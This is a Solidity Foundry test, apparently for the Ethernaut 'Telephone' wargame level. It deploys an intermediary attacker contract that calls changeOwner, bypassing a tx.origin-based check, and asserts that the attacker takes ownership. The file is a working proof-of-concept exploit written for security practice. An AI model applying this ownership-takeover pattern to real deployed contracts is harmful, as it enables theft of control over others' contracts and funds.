// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Telephone} from "../src/Telephone.sol";

// Attacker's contract
contract MaliciousUser {
    Telephone immutable target;

    constructor(address _target) {
        target = Telephone(_target);
    }

    function dummyChangeOwner(address _attacker) external {
        target.changeOwner(_attacker);
    }
}

contract TelephoneTest is Test {
    Telephone telephone;
    MaliciousUser maliciousUser;
    address attacker = makeAddr("attacker");

    function setUp() public {
        telephone = new Telephone();
        maliciousUser = new MaliciousUser(address(telephone));
    }

    function testOwnerCanBeChangedByAnAttacker() public {
        // assert attcker is not the owner
        assert(telephone.owner() != attacker);
        // call dummyChangeOwner()
        vm.startPrank(attacker);
        maliciousUser.dummyChangeOwner(attacker);
        vm.stopPrank();
        // assert the new owner
        assert(telephone.owner() == attacker);
    }
}